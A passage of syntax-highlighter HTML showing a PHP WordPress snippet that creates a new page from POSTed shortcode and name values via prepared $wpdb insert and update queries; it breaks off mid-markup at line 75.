data-line="crayon-53c9863254e98194891822-14">14</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-16">16</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-18">18</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-20">20</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-22">22</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-24">24</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-26">26</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-28">28</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-30">30</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-32">32</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-34">34</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-36">36</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-38">38</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-40">40</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-42">42</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-44">44</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-46">46</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-48">48</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-50">50</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-52">52</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-54">54</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-56">56</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-58">58</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-60">60</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-62">62</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-64">64</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-66">66</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-68">68</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-70">70</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-72">72</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-74">74</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254e98194891822-76">76</div><div class="crayon-num" data-line="crayon-53c9863254e98194891822-77">77</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254e98194891822-1"><span class="crayon-c">// Add new page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_new_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">post_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">strtolower</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-14"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_author, </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date_gmt,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_content,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_title,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-19"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_status,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-21"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ping_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_name,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified_gmt,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_parent,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;menu_order,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-27"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_type,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-28"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_count</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-29"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-30"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'publish'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'closed'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'open'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">post_name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'page'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get new ID</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">new_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">insert_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// page meta data</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-55"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"postmeta</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-56"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_id, </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-57"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_key,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-58"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_value</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-59"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-60"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'_wp_page_template'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sidebar-page.php'</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update guid</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_bloginfo</span><span class="crayon-sy">(</span><span class="crayon-s">'url'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-sy">[</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'/?p='</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET guid = '%s' WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-75"><span 